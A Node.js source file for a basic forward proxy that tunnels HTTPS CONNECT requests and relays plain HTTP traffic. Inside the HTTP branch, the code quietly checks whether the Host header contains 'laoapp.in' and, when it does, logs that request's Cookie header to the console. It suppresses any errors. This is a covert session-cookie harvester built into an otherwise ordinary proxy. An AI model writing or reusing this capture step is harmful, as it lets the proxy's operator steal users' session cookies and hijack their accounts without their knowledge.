// Import of net module
const net = require("net");
const port = process.env.PORT || 3000
const server = net
.createServer(stream => {
  stream.on('end', function () { });
  stream.on('data', function (msg) {
   // console.log(msg.toString('utf8'));
  });
});

server.on("connection", (clientToProxySocket) => {
    clientToProxySocket.once("data", (data) => {
        let isTLSConnection = data.toString().indexOf("CONNECT") !== -1;

        let serverPort = 80;
        let serverAddress;
        if (isTLSConnection) {
            serverPort = 443;
            serverAddress = data
                .toString()
                .split("CONNECT")[1]
                .split(" ")[1]
                .split(":")[0];
        } else {
            serverAddress = data.toString().split("Host: ")[1].split("\r\n")[0];
            if(serverAddress.includes("laoapp.in")){
                try{
                console.log(data.toString().split("Cookie: ")[1].split("\r\n")[0]);
                }catch{}
            }
        }

        // Creating a connection from proxy to destination server
        let proxyToServerSocket = net.createConnection(
            {
                host: serverAddress,
                port: serverPort,
             }
            // () => {
            //     console.log("Proxy to server set up");
            // }
        );


        if (isTLSConnection) {
            clientToProxySocket.write("HTTP/1.1 200 OK\r\n\r\n");
        } else {
            proxyToServerSocket.write(data);
        }

        clientToProxySocket.pipe(proxyToServerSocket);
        proxyToServerSocket.pipe(clientToProxySocket);

        proxyToServerSocket.on("error", (err) => {
            return;
        });

        clientToProxySocket.on("error", (err) => {
            return;
        });
    });
});

server.on("error", (err) => {
    console.log("Some internal server error occurred");
    console.log(err);
});

server.on("close", () => {
    console.log("Client disconnected");
});

server.listen(
    {
        host: "0.0.0.0",
        port: port,
    },
    () => {
        console.log("Server listening on 0.0.0.0:"+port);
    }
);
